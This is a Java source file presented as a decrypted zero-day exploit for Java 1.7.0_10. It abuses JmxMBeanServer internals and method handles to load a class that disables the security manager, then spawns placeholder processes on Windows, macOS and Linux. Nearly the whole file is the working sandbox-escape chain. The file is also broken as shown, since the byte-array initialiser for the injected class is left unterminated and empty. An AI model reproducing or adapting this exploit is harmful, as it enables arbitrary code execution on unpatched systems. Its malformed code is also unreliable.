/*
Java 0day 1.7.0_10 decrypted source
Originaly placed on https://damagelab.org/index.php?showtopic=23719&st=0
From Russia with love.
 */

import java.io.IOException;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.security.AccessController;
import java.security.PrivilegedExceptionAction;

import com.sun.jmx.mbeanserver.JmxMBeanServer;
import com.sun.jmx.mbeanserver.JmxMBeanServerBuilder;
import com.sun.jmx.mbeanserver.MBeanInstantiator;

@SuppressWarnings({ "restriction" })
public class Exploit {

    public static byte[] hex2Byte(String paramString) {
        byte[] arrayOfByte = new byte[paramString.length() / 2];
        for (int i = 0; i < arrayOfByte.length; i++) {
            arrayOfByte[i] = (byte) Integer.parseInt(paramString.substring(2 * i, 2 * i + 2), 16);
        }
        return arrayOfByte;
    }

    public static byte[] B$class_bytes = hex2Byte(


    // Decompilation credit to benmmurphy
    // http://www.reddit.com/r/netsec/comments/16b4n1/0day_exploit_fo_java_17u10_spotted_in_the_wild/c7ulpd7
    // basically, it's this, as if this were compiled and saved on disk.
    static class B implements PrivilegedExceptionAction<Object> {
        public B() {
            try {
                AccessController.doPrivileged(this);
            } catch (Exception e) {
            }
        }

        public Object run() {
            // This basically removes the security manager
            System.setSecurityManager(null);
            return new Object();
        }
    }

    @SuppressWarnings("rawtypes")
    public void init() {
        System.out.println("Exploit starting...");
        try {
            // ================================================================
            // STEP 0: get introspection objects

            // Conveniences
            ClassLoader null_ClassLoader = null;
            Object[] _zero_args_ = {};

            // "Returns a lookup object which is trusted minimally.
            // It can only be used to create method handles to publicly
            // accessible fields and methods."
            MethodHandles.Lookup lookup = MethodHandles.publicLookup();

            // Used to load the "sun.org.mozilla.javascript.internal.*" classes
            // Looks like these classes load some normally inaccessible
            // libraries. Can't find any good documentation on them.
            MBeanInstantiator localMBeanInstantiator = ((JmxMBeanServer) new JmxMBeanServerBuilder().newMBeanServer("",
                    null, null)).getMBeanInstantiator();

            // Used to invoke reflection on the javascript classes
            // method type: MethodHandle <method> (Class, String, MethodType)
            MethodType mt_MethodHandle__Class_String_MethodType = MethodType.methodType(MethodHandle.class,
                    Class.class, new Class[] { String.class, MethodType.class });

            // MethodHandles.Lookup.findVirtual(Class, String, MethodType)
            MethodHandle MethodHandles$Lookup$findVirtual = lookup.findVirtual(MethodHandles.Lookup.class,
                    "findVirtual", mt_MethodHandle__Class_String_MethodType);

            // method type: MethodHandle <method> (Class, MethodType)
            MethodType mt_MethodHandle__Class_MethodType = MethodType.methodType(MethodHandle.class, Class.class,
                    new Class[] { MethodType.class });

            // MethodHandles.Lookup.findConstructor(Class, MethodType)
            MethodHandle MethodHandles$Lookup$findConstructor = lookup.findVirtual(MethodHandles.Lookup.class,
                    "findConstructor", mt_MethodHandle__Class_MethodType);

            System.out.println("STEP 0 Complete!");
            // ================================================================
            // STEP 1: Load the GeneratedClassLoader interface that declares a
            // public
            // "defineClass" method so we can take our bytes and turn it into a
            // live Java Class.
            Class GeneratedClassLoader$class = localMBeanInstantiator.findClass(
                    "sun.org.mozilla.javascript.internal.GeneratedClassLoader", null_ClassLoader);

            System.out.println("STEP 1 Complete!");
            // ================================================================
            // STEP 2: Create a Javascript "Context" to get a reference to a
            // Javascript GeneratedClassLoader via
            // "Context.createClassLoader(ClassLoader)".
            Class Context$class = localMBeanInstantiator.findClass("sun.org.mozilla.javascript.internal.Context",
                    null_ClassLoader);
            MethodType mt_Void__Void = MethodType.methodType(Void.TYPE);
            MethodHandle Context$Context = (MethodHandle) MethodHandles$Lookup$findConstructor
                    .invokeWithArguments(new Object[] { lookup, Context$class, mt_Void__Void });
            Object jsContext = Context$Context.invokeWithArguments(_zero_args_);

            System.out.println("STEP 2 Complete!");
            // ================================================================
            // STEP 3: Create a GeneratedClassLoader object.
            MethodType mt_GeneratedClassLoader__ClassLoader = MethodType.methodType(GeneratedClassLoader$class,
                    ClassLoader.class);
            MethodHandle Context$createClassLoader = (MethodHandle) MethodHandles$Lookup$findVirtual
                    .invokeWithArguments(new Object[] { lookup, Context$class, "createClassLoader",
                            mt_GeneratedClassLoader__ClassLoader });
            Object generatedClassLoader = Context$createClassLoader
                    .invokeWithArguments(new Object[] { jsContext, null });

            System.out.println("STEP 3 Complete!");
            // ================================================================
            // STEP 4: Define the class "B" - the bytes "B$class_bytes" is
            // basically what you would get "on disk" if you compiled the "B"
            // class.
            MethodType mt_Class__String_bytearray = MethodType.methodType(Class.class, String.class,
                    new Class[] { byte[].class });
            MethodHandle GeneratedClassLoader$defineClass = (MethodHandle) MethodHandles$Lookup$findVirtual
                    .invokeWithArguments(new Object[] { lookup, GeneratedClassLoader$class, "defineClass",
                            mt_Class__String_bytearray });
            Class B$class = (Class) GeneratedClassLoader$defineClass.invokeWithArguments(new Object[] {
                    generatedClassLoader, null, B$class_bytes });

            System.out.println("STEP 4 Complete!");
            // ================================================================
            // STEP 5: Create a new "B" object, which disables the security manager in it's
            // constructor
            B$class.newInstance();

            System.out.println("STEP 5 Complete!");
            System.out.println("Exploit successful!");
            // ================================================================
            // PROFIT!!!1!
            try {
                String os = System.getProperty("os.name").toLowerCase();
                System.out.println("OS: " + os);
                if (os.contains("win")) {
                    // On Windows, start a PowerShell command that will keep an empty process
                    Runtime.getRuntime().exec("cmd /c start \"Hacked\" cmd.exe /c \"pause\"");
                } else if (os.contains("mac")) {
                    // On macOS, start a dummy script with an empty command
                    Runtime.getRuntime().exec(new String[]{"sh", "-c", "echo Hacked; exec sleep infinity"});
                } else if (os.contains("nix") || os.contains("nux")) {
                    // On Linux, start a process that does nothing
                    for (int i = 0; i < 5; i++) {
                        // Spawn a process that does nothing but stays alive
                        Process process = Runtime.getRuntime().exec("sleep infinity");

                        // Alternative for maximum compatibility (e.g., older systems):
                        // Process process = Runtime.getRuntime().exec("tail -f /dev/null");

                        System.out.println("Spawned process #" + (i + 1));
                    }
                } else {
                    System.out.println("Operating system not supported for this dummy process.");
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        } catch (Throwable ex) {
        }
    }

}